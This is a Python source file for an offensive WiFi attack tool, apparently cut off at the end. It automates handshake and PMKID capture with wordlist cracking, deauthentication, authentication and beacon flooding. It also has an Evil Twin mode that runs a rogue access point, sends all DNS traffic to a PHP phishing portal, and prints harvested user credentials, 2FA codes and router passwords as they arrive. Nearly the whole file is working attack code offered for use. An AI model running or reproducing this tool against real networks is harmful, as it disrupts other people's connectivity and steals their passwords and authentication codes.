from colorama import Fore
import sys
import os
import subprocess
import time
import signal
import argparse
import git

# Global Variable
global netInterfaceName


def ctrl_c(signum, frame):
    get_colours("\n[!] Stopping attack...", "mangeta")
    # Killing all the xterm process.
    process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    out, err = process1.communicate()
    for line in out.splitlines():
        if b'xterm' in line:
            pid = int(line.split(None, 1)[0])
            os.kill(pid, signal.SIGKILL)
    get_colours("\n\n[!] Clearing Temporary files..", "red")
    get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", netInterfaceName], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "yellow")
    os.system("rm -rf Cap*")
    os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
    time.sleep(2)
    get_colours("\n[*] Exiting the program...", "blue")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Script Banner
def script_banner():
    owner = r"""
            __      _____ ___ ___   /\/|   ___ ___    _   ___ 
     \ \    / /_ _| __|_ _| |/\/   / __| _ \  /_\ / __| |/ /       
      \ \/\/ / | || _| | |        | (__|   / / _ \ (__| ' <   
       \_/\_/ |___|_| |___|        \___|_|_\/_/ \_\___|_|\_\    
                                                             
    """

# Colours
def get_colours(text, color):
    if color == "green":
        green_color = Fore.GREEN + text
        print(green_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)
    elif color == "yellow":
        yellow_color = Fore.YELLOW + text
        print(yellow_color)
    elif color == "magenta":
        magenta_color = Fore.MAGENTA + text
        print(magenta_color)
    elif color == "cyan":
        cyan_color = Fore.CYAN + text
        print(cyan_color)


def menu_panel():
    get_colours(f"[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -i <Network interface> "
                                                                                            "-m <Attack mode>",
                "green")
    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network interface'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-m]'}{Fore.YELLOW + ' Attack mode'}")
    print("")
    get_colours(f"\t Handshake (Capture a handshake)", "blue")
    get_colours(f"\t PKMID (Clientless attack)", "blue")
    get_colours(f"\t AAuth (Authentication Denial-Of-Service)", "blue")
    get_colours(f"\t DAuth (Deauthentication attack)", "blue")
    get_colours(f"\t BFlood (Beacon flooding attack)", "blue")
    get_colours(f"\t ETwin (Evil Twin attack)", "blue")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.


def check_deps(interfaceName, attackMode):
    if os.getuid() != 0:
        script_banner()
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
              f"{Fore.RED + ' Run this script with administrator privileges.'}")
        exit()

    subprocess.run(["clear"])
    script_banner()
    get_colours("\n\n[*] Checking necessary programs...", "blue")
    # Check MDK4
    check_mdk3 = subprocess.run(["which", "mdk4"], capture_output=True, text=True)
    if "mdk4" in check_mdk3.stdout:
        get_colours(f"\nMDK4\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nMDK4 \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [MDK4]....", "cyan")
        install_mdk4 = subprocess.run(["sudo", "apt", "install", "mdk4", "-y"], capture_output=True,
                                      text=True)
        if "Setting up mdk4" in install_mdk4.stdout:
            get_colours("\n[*] MDK4 Installed...", "blue")
            check_deps(interfaceName, attackMode)  # Check for MDK4
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install mdk4'}")
            print(Fore.WHITE)
            exit()
    # Check Hashcat
    check_hashcat = subprocess.run(["which", "hashcat"], capture_output=True, text=True)
    if "hashcat" in check_hashcat.stdout:
        get_colours(f"\nHashcat\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nHashcat \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Hashcat]....", "cyan")
        install_hashcat = subprocess.run(["sudo", "apt", "install", "hashcat", "-y"], capture_output=True,
                                         text=True)
        if "Setting up Hashcat" in install_hashcat.stdout:
            get_colours("\n[*] Hashcat Installed...", "blue")
            check_deps(interfaceName, attackMode)  # Another Check for HASHCAT
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hashcat'}")
            print(Fore.WHITE)
            exit()
    # Check Mac-Changer
    check_macchanger = subprocess.run(["which", "macchanger"], capture_output=True, text=True)
    if "macchanger" in check_macchanger.stdout:
        get_colours(f"\nMacchanger\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nMacchanger \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Macchanger]....", "cyan")
        install_macchanger = subprocess.run(["sudo", "apt", "install", "macchanger", "-y"], capture_output=True,
                                            text=True)
        if "Setting up macchanger" in install_macchanger.stdout:
            get_colours("\n[*] Macchanger Installed...", "blue")
            check_deps(interfaceName, attackMode)
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install macchanger'}")
            print(Fore.WHITE)
            exit()
    # Check Airmon-Ng
    check_airmon_ng = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
    if "airmon-ng" in check_airmon_ng.stdout:
        get_colours(f"\nAirmon-ng \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nAirmon-ng \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Airmon-ng]....", "cyan")
        install_airmon_ng = subprocess.run(["sudo", "apt", "install", "airmon-ng", "-y"], capture_output=True,
                                           text=True)
        if "Setting up airmon-ng" in install_airmon_ng.stdout:
            get_colours("\n[*] Airmon-ng Installed...", "blue")
            check_deps(interfaceName, attackMode)
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install airmon-ng'}")
            print(Fore.WHITE)
            exit()
    # Check hcxdumptool
    check_hcxdumptool = subprocess.run(["which", "hcxdumptool"], capture_output=True, text=True)
    if "hcxdumptool" in check_hcxdumptool.stdout:
        get_colours(f"\nhcxdumpTool \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nhcxdumpTool \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [hcxdumpTool]....", "cyan")
        install_hcxdump = subprocess.run(["sudo", "apt", "install", "hcxdumptool", "-y"], capture_output=True,
                                         text=True)
        subprocess.run(["sudo", "apt", "install", "hcxtools"], stdout=subprocess.DEVNULL)
        if "Setting up hcxdumptool" in install_hcxdump.stdout:
            get_colours("\n[*] hcxdumpTool Installed...", "blue")
            check_deps(interfaceName, attackMode)
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxdumptool'}")
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxtools'}")
            print(Fore.WHITE)
            exit()
    # Check for hcxpcaptool
    check_hcxpcaptool = subprocess.run(["which", "hcxpcaptool"], capture_output=True, text=True)
    if "hcxpcaptool" not in check_hcxpcaptool.stdout:
        get_colours(f"\n[!] Install the '[hcxpcaptool]' package from the following github repository: ", 'red')
        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' git clone https://github.com/warecrer/Hcxpcaptool'}")
        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' make'}")
        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make install'}")
        print(Fore.WHITE)
        exit()
    # Check for dnsmasq
    check_dnsmasq = subprocess.run(["which", "dnsmasq"], capture_output=True, text=True)
    if "dnsmasq" in check_dnsmasq.stdout:
        get_colours(f"\nDnsmasq\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nDnsmasq\t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Dnsmasq]....", "cyan")
        install_dnsmasq = subprocess.run(["sudo", "apt", "install", "dnsmasq", "-y"], capture_output=True,
                                         text=True)
        if "Setting up dnsmasq" in install_dnsmasq.stdout:
            get_colours("\n[*] Dnsmasq Installed...", "blue")
            check_deps(interfaceName, attackMode)
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install dnsmasq'}")
            print(Fore.WHITE)
            exit()
    # Check for hostapd
    check_hostapd = subprocess.run(["which", "hostapd"], capture_output=True, text=True)
    if "hostapd" in check_hostapd.stdout:
        get_colours(f"\nHostapd\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nHostapd\t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Hostapd]....", "cyan")
        install_hostapd = subprocess.run(["sudo", "apt", "install", "hostapd", "-y"], capture_output=True,
                                         text=True)
        if "Setting up hostapd" in install_hostapd.stdout:
            get_colours("\n[*] Dnsmasq Installed...", "blue")
            check_deps(interfaceName, attackMode)
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hostapd'}")
            print(Fore.WHITE)
            exit()
    # Check Xterm
    check_xterm = subprocess.run(["which", "xterm"], capture_output=True, text=True)
    if "xterm" in check_xterm.stdout:
        get_colours(f"\nXterm \t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nXterm \t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Xterm]....", "cyan")
        install_airmon_ng = subprocess.run(["sudo", "apt", "install", "xterm", "-y"], capture_output=True,
                                           text=True)
        if "Setting up xterm" in install_airmon_ng.stdout:
            get_colours("\n[*] Xterm Installed...", "blue")
            check_deps(interfaceName, attackMode)
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install xterm'}")
            print(Fore.WHITE)
            exit()

    time.sleep(2)
    attack_func(interfaceName, attackMode)  # If all the necessary programs are installed then call the attack func.
    print(Fore.WHITE)



""" Save the capture output in the corresponding directorys """
def createDir(currentDir, accessPointName):
    if os.path.exists(currentDir + '/wifiOutput/'):
        if not os.path.exists(currentDir + '/wifiOutput/' + accessPointName):
            os.system(f"""mkdir {currentDir}/wifiOutput/{accessPointName}""")
        else:
            os.system(f"""sudo rm -rf {currentDir}/wifiOutput/{accessPointName}/*""")
    else:
        os.system(f"""mkdir {currentDir}/wifiOutput""")
        os.system(f"""mkdir {currentDir}/wifiOutput/{accessPointName}""")
    
    return currentDir + "/wifiOutput/" + accessPointName



""" Read files for ETwin Attack """


def read_file(attack_type):
    if attack_type == "newAccessPoint":
        with open("./ETwin-templates/login-temp/users-creds.txt", "r") as f:
            readFile_user = f.readlines()
        with open("./ETwin-templates/login-temp/portal_2fa/2fa.txt", "r") as f:
            readFile_2fa = f.readlines()
        return readFile_user, readFile_2fa
    else:
        with open("./ETwin-templates/firmware-upgrade/router-pass.txt", "r") as f:
            readFile_user = f.readlines()
        return readFile_user


def getCredentials(attack_type):
    if attack_type == "newAccessPoint":
        initial_user, initial_2fa = read_file(attack_type)
        while True:
            current_user, current_2fa = read_file(attack_type)
            if initial_user != current_user:
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
                print(Fore.WHITE)
                for line in current_user:
                    print(line)
                print(Fore.WHITE)
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")

                initial_user = current_user

            if initial_2fa != current_2fa:
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
                print(Fore.WHITE)
                for line in current_2fa:
                    print(line)
                print(Fore.WHITE)
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
                initial_2fa = current_2fa
    else:
        initial_user = read_file(attack_type)
        while True:
            current_user = read_file(attack_type)
            if initial_user != current_user:
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
                print(Fore.WHITE)
                for line in current_user:
                    print(line)
                print(Fore.WHITE)
                print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")

                initial_user = current_user


# Attack Function
def attack_func(network_interface, attack_mode):
    time.sleep(1)
    subprocess.run(["clear"])
    get_colours("\n[*] Setting up network card...", "yellow")
    os.system(f"sudo ifconfig {network_interface} down")  # To Avoid channel problems.
    time.sleep(2)
    subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
    get_colours("\n[!] Generating new Mac Address...", "cyan")
    time.sleep(3)

    try:
        check_adap = subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], capture_output=True,
                                    text=True)
        if "No such device" in check_adap.stderr:
            network_interface = network_interface
        else:
            network_interface = network_interface + 'mon'
    except:
        pass

    global netInterfaceName
    netInterfaceName = network_interface

    subprocess.run(["sudo", "ifconfig", network_interface, "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "macchanger", "-r", network_interface], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "ifconfig", network_interface, "up"], stdout=subprocess.DEVNULL)

    get_colours("\n[*] New Mac Address Generated ", "blue")
    time.sleep(1)
    subprocess.run(["clear"])

    # HandShake Attack Mode
    if attack_mode == "Handshake":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
        # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
        access_name = input(Fore.YELLOW + "Access point name: " + Fore.WHITE)
        access_channel = input(Fore.YELLOW + "Channel number: " + Fore.WHITE)
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        get_current_path = subprocess.check_output('pwd').strip()
        createPath = createDir(get_current_path.decode(), access_name.replace(" ", ""))
        set_path = f'{createPath}/Capture'
        get_colours("\n[*] Waiting for the Handshake", 'cyan')
        os.system(
            f"""xterm -hold -e sudo airodump-ng -c {access_channel} --essid '{access_name}' -w {set_path} {network_interface} &""")
        time.sleep(6)
        os.system(f"""xterm -hold -e aireplay-ng -0 30 -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
        time.sleep(2)
        subprocess.run(["clear"])
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = process1.communicate()
        timer_total = 70
        timer_process = range(timer_total, 9, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        os.system('clear')
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        timer_process = range(9, 0, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        # time.sleep(65)
        for line in out.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                os.kill(pid, signal.SIGKILL)
        subprocess.run(["clear"])
        get_colours("\n[*] Clearing processes", 'red')
        time.sleep(2)
        os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}-01.cap &")
        os.system('clear')
        quit_program(network_interface)
    # PKMID Attack Mode
    elif attack_mode == "PKMID":
        subprocess.run(["clear"])
        time.sleep(1)
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        get_colours("\n[*] Starting the PKMID Client-Less ATTACK", "magenta")
        time.sleep(3)
        get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(150)} Seconds", 'blue')
        get_colours("", "yellow")
        get_current_path = subprocess.check_output('pwd').strip()
        saveOutput = createDir(get_current_path.decode(), "PKMID")
        process = subprocess.Popen(
            ["sudo", "hcxdumptool", "-i" + network_interface, "--enable_status=1", "-o", f"{saveOutput}/Capture_PKMID"])
        try:
            process.wait(timeout=150)  # Time for the process
        except subprocess.TimeoutExpired:
            get_colours(f"\n[!] Timed out - killing process ID -  {Fore.BLUE + str(process.pid)}", 'red')
            process.kill()
        time.sleep(2)
        subprocess.run(["clear"])
        get_colours("\n[!] Clearing Temporary files..", "red")
        print(Fore.WHITE)
        time.sleep(3)
        get_colours("", "yellow")
        subprocess.run(["clear"])
        get_pkmid_hashes = subprocess.run([f"sudo hcxpcaptool -z wifiOutput/PKMID/myHashes_PKMID wifiOutput/PKMID/Capture_PKMID"],
                                          capture_output=True, text=True, shell=True)
        time.sleep(2)
        get_colours("\n[*] Trying getting hashes", "magenta")
        # subprocess.run(["rm", "Capture_PKMID"])
        time.sleep(2)
        if "PMKID(s) written to wifiOutput/PKMID/myHashes_PKMID" in get_pkmid_hashes.stdout:
            subprocess.run(["clear"])
            get_colours("[*] Starting with Brute-Force attack..".strip(), "blue".strip())
            os.system(f"xterm -hold -e hashcat -m 22000 -a 0 -w 4 {saveOutput}/myHashes_PKMID /usr/share/wordlists/rockyou.txt "
                      f"-d 1 --force &")
            os.system("clear")
            quit_program(network_interface)
        else:
            os.system('clear')
            get_colours("\n[-] no hashes captured...", "red")
            time.sleep(2)
            os.system("rm -rf Cap*")
            os.system('clear')
            quit_program(network_interface)
    # Deauthentication Attack Mode
    elif attack_mode == "DAuth":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
        access_name = input(Fore.YELLOW + "Access point name: "  + Fore.WHITE)
        access_channel = input(Fore.YELLOW + "Channel number: "  + Fore.WHITE)
        attack_time = input(Fore.YELLOW + "Time for the attack (seconds): " + Fore.WHITE)
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        os.system(f"sudo ifconfig {network_interface} down")
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        os.system(
            f"""xterm -hold -e sudo airodump-ng -c {access_channel} --essid '{access_name}' {network_interface} &""")
        os.system(
            f"""xterm -hold -e aireplay-ng -0 {int(attack_time) * 400} -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
        subprocess.run(["clear"])
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = process1.communicate()
        timer_total = int(attack_time)
        timer_process = range(timer_total, 9, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        os.system('clear')
        script_banner()
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        timer_process = range(9, 0, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        # time.sleep(65)
        for line in out.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                os.kill(pid, signal.SIGKILL)
        get_colours("\n\n\n[*] Attack completed successfully", 'green')
        quit_program(network_interface)
    # Beacon Flood Attack Mode
    elif attack_mode == "BFlood":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        os.system('clear')
        get_colours("[*] Starting the attack...", 'blue')
        get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
        get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
        os.system(
            f"xterm -hold -e sudo mdk4 {network_interface} b -s 950")
        quit_program(network_interface)
    # Authentication Denial-Of-Service
    elif attack_mode == "AAuth":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
        access_bssid = input(Fore.YELLOW + "Access point BSSID: " + Fore.WHITE)
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        get_colours("[*] Starting the attack...", 'blue')
        get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
        get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
        os.system(
            f"""xterm -hold -e sudo mdk4 {network_interface} a -a '{access_bssid}'""")
        quit_program(network_interface)
    # Evil Twin Attack
    elif attack_mode == "ETwin":
        get_colours("[*] Select the type of attack", 'yellow')
        print("")
        get_colours(f"\t[A] Create a new access point", "blue")
        get_colours(f"\t[B] Duplicate an existing access point", "blue")
        print("")
        # Verify user input
        get_attack_type = input(Fore.YELLOW + "Options (A/B): " + Fore.WHITE)
        verify_option = False
        if get_attack_type != "A" and get_attack_type != "B":
            verify_option = True
        while verify_option:
            get_attack_type = input(Fore.YELLOW + "Options (A/B): " + Fore.WHITE)
            if get_attack_type != "A" and get_attack_type != "B":
                verify_option = True
            else:
                verify_option = False

        if get_attack_type == "A":
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
            access_name = input(Fore.YELLOW + "Access point name to use: "  + Fore.WHITE)
            access_channel = input(Fore.YELLOW + "Channel number: "  + Fore.WHITE)
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Configuring files...'}")
            set_hostapd = f"""interface={network_interface}\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
                    """
            set_dnsmasq = f""" 
                    interface={network_interface}\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
                    \naddress=/#/192.168.1.1 """
            # Saving HOSTAPD config
            hostapd_config = open("wifi_hostapd.conf", "w+")
            hostapd_config.write(set_hostapd.strip())
            hostapd_config.close()

            # Saving DNSMASQ config
            dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
            dnsmasq_config.write(set_dnsmasq.strip())
            dnsmasq_config.close()
            # Adding routes
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
            subprocess.run([f"ifconfig {network_interface} up 192.168.1.1 netmask 255.255.255.0"], shell=True)
            subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
            # get PWD
            get_pwd = subprocess.check_output(["pwd"]).decode().strip()
            # Start HOSTAPD
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Hostapd...'}")
            time.sleep(2)
            os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
            # Start DNSMASQ
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Dnsmasq...'}")
            time.sleep(2)
            os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
            # Starting the PHP server
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
            time.sleep(3)
            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
            php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
            print(Fore.WHITE)
            getCredentials("newAccessPoint")
            # Killing all the process.
            process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
            out, err = process1.communicate()
            for line in out.splitlines():
                if b'xterm' in line:
                    pid = int(line.split(None, 1)[0])
                    os.kill(pid, signal.SIGKILL)
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Log data is save inside (ETwin-Templates/login-temp) folder.'}")
            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
            os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
            get_colours("\n\n[*] Attack completed successfully", 'green')
            quit_program(network_interface)
        elif get_attack_type == "B":
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
            process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
            # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
            access_name = input(Fore.YELLOW + "Access point name: " + Fore.WHITE)
            access_channel = input(Fore.YELLOW + "Channel number: " + Fore.WHITE)
            time.sleep(1)
            get_colours("\n[*] Setting up things...", 'cyan')
            try:
                process.wait(timeout=2)  # Time for the process
            except subprocess.TimeoutExpired:
                process.kill()
            os.system(
                f"""xterm -hold -e aireplay-ng -0 4000000 -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
            subprocess.run(["clear"])
            script_banner()
            get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
            print("")
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Duplicating access point...'}")
            set_hostapd = f"""interface={network_interface}\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
                                """
            set_dnsmasq = f""" 
                        interface={network_interface}\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
                        \naddress=/#/192.168.1.1 """
            # Saving HOSTAPD config
            hostapd_config = open("wifi_hostapd.conf", "w+")
            hostapd_config.write(set_hostapd.strip())
            hostapd_config.close()

            # Saving DNSMASQ config
            dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
            dnsmasq_config.write(set_dnsmasq.strip())
            dnsmasq_config.close()
            # Adding routes
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
            subprocess.run([f"ifconfig {network_interface} up 192.168.1.1 netmask 255.255.255.0"], shell=True)
            subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
            # get PWD
            get_pwd = subprocess.check_output(["pwd"]).decode().strip()
            # Start HOSTAPD
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Hostapd...'}")
            time.sleep(2)
            os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
            # Start DNSMASQ
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting Dnsmasq...'}")
            time.sleep(2)
            os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
            # Starting the PHP server
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
            time.sleep(3)
            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
            php_server = os.system(f"cd ETwin-templates/firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
            print(Fore.WHITE)
            getCredentials("dupAccesPoint")
            # Killing all the process.
            process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
            out, err = process1.communicate()
            for line in out.splitlines():
                if b'xterm' in line:
                    pid = int(line.split(None, 1)[0])
                    os.kill(pid, signal.SIGKILL)
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Log data is save inside (ETwin-Templates/firmware-upgrade) folder.'}")
